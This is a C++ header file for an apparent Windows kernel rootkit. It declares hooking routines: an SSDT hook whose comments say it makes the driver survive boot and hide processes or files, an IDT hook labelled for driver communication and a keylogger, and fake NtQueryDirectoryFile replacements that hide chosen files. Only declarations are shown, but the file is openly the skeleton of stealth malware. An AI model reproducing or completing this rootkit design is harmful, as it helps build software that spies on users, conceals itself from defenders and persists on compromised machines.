#pragma once
#include "requests.h"


// Memory functions pool structure is 'Hk..'
void ShrootUnload(PDRIVER_OBJECT DriverObject);
namespace roothook {
	NTSTATUS SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag);  // Hook to a function from the windows 10 kernel / from a driver
	NTSTATUS SystemServiceDTHook();  // Perform an SSDT hook for the driver to survive boot / to hide processes or files
	NTSTATUS InterruptDTHook();  // Perform an IDT hook for driver communication / keylogger
	NTSTATUS HookHandler(PVOID hookedf_params);  // Handles the hooking to another kernel function of the wanted external function
	NTSTATUS EvilQueryDirectoryFile(IN HANDLE FileHandle,
		IN HANDLE Event OPTIONAL,
		IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
		IN PVOID ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK IoStatusBlock,
		OUT PVOID FileInformation,
		IN ULONG FileInformationLength,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN ReturnSingleEntry,
		IN PUNICODE_STRING FileName OPTIONAL,
		IN BOOLEAN RestartScan);  // Fake NtQueryDirectoryFile function to trace and hide wanted files
	NTSTATUS EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
		IN HANDLE Event OPTIONAL,
		IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
		IN PVOID ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK IoStatusBlock,
		OUT PVOID FileInformation,
		IN ULONG Length,
		FILE_INFORMATION_CLASS FileInformationClass,
		IN ULONG QueryFlags,
		IN PUNICODE_STRING FileName OPTIONAL);  // Fake NtQueryDirectoryFileEx function to trace and hide wanted files
}